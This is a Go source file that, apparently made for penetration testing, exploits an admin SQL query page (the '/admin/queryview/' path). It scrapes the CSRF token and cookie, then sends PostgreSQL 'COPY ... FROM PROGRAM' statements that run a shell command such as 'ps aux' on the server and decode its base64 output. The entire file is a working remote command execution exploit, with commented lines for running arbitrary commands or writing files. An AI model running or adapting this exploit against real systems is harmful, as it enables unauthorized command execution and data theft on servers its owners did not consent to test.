package main

import (
	"encoding/base64"
	"fmt"
	"gopkg.in/h2non/gentleman.v2"
	"gopkg.in/h2non/gentleman.v2/plugins/body"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

const REQ string = "&conn_id=bi_kd&sql="
const PATH string = "/admin/queryview/"

func GetRequest(client *gentleman.Client) (csrfToken string, cookie *http.Cookie) {
	request := client.Request()
	request.Method("GET")
	request.Path(PATH)
	response, err := request.Send()
	if err != nil {
		log.Printf("Request error: %s\n", err)
		panic("GET request error")
		return
	}

	reCsrf := regexp.MustCompile(`\_csrf\_token[^\>]+`)
	csrfToken = reCsrf.FindAllString(response.String(), -1)[0]
	csrfToken = strings.Replace(csrfToken, `_csrf_token" type="hidden" value="`, "_csrf_token=", -1)
	csrfToken = strings.Replace(csrfToken, `"`, "", -1)
	cookie = response.Cookies[0]
	return
}

func main() {
	cli := gentleman.New()
	cli.URL("https://example.com")

	csrfToken, cookie := GetRequest(cli)

	reqPost := cli.Request()
	reqPost.Method("POST")
	reqPost.Path("/admin/queryview/")
	reqPost.AddCookie(cookie)
	reqPost.SetHeader("Content-Type", "application/x-www-form-urlencoded")

	//dat, err := ioutil.ReadFile("C:\\Users\\Alexey\\Downloads\\nmap.10")
	//fmt.Println(string(dat))

	//command := os.Args[1]
	//command := `echo "` + string(dat) + `" > nm`
	command := `ps aux`
	commandb64 := command + " 0>&1 2>&1 | base64 -w 0"
	commandb64 = strings.TrimSpace(commandb64)

	sql := `DROP TABLE IF EXISTS pentest_rce2;
CREATE TABLE pentest_rce2(output TEXT);
COPY pentest_rce2 FROM PROGRAM '` + commandb64 + `';
SELECT output FROM pentest_rce2;`

	reqPost.Use(body.String(csrfToken + REQ + url.QueryEscape(sql)))

	res, err := reqPost.Send()
	if err != nil {
		log.Printf("Request error: %s\n", err)
		panic("error")
		return
	}
	if !res.Ok {
		log.Printf("Invalid server response: %d\n", res.StatusCode)
		panic("error")
		return
	}

	re := regexp.MustCompile(`<td>.*</td>`)
	responseStringFull := re.FindAllString(res.String(), -1)

	if len(responseStringFull) > 1 {
		log.Printf("%q", responseStringFull)
		panic("error")
	}

	responseStringFull[0] = strings.Replace(responseStringFull[0], "<td>", "", -1)
	responseStringFull[0] = strings.Replace(responseStringFull[0], "</td>", "", -1)
	StringDecoded, _ := base64.StdEncoding.DecodeString(responseStringFull[0])
	fmt.Println(string(StringDecoded))
}
